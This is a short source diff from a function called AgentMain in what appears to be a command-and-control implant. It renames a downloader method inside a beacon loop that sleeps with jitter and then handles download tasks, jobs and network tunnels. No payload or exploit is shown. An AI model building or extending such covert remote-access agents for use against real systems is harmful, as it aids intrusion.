@@ -57,7 +57,7 @@ void AgentMain()
 		if (g_Agent->IsActive() && packerOut->datasize() < 8 )
 			WaitMask( g_Agent->config->sleep_delay, g_Agent->config->jitter_delay );
 
-		g_Agent->downloader->ProcessDownloadTasks(packerOut);			
+		g_Agent->downloader->ProcessDownloader(packerOut);			
 		g_Agent->jober->ProcessJobs(packerOut);
 		g_Agent->proxyfire->ProcessTunnels(packerOut);
 
